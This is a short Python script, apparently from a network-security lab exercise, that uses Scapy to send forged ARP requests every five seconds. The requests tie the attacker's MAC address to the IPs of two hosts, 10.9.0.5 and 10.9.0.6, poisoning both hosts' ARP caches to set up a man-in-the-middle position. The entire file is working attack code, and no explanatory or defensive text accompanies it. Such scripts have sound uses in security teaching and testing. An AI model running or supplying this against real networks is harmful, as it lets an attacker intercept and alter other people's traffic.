#!/usr/bin/env python3
from scapy.all import *
import time

ipA = "10.9.0.5"
ipB = "10.9.0.6"

macM = "02:42:0a:09:00:69"
ipM = "10.9.0.105"

def sendrequest(ipsrc, ipdst):
	print(f"Sending packet to {ipsrc}")
	ether = Ether(src = macM, dst = "ff:ff:ff:ff:ff:ff")
	arp = ARP(op = 1, psrc = ipsrc, hwsrc = macM, pdst = ipdst)
	pkt = ether/arp
	sendp(pkt)

while True:
	print("Sending to both machine")
	sendrequest(ipA, ipB)
	sendrequest(ipB, ipA)
	time.sleep(5)
	
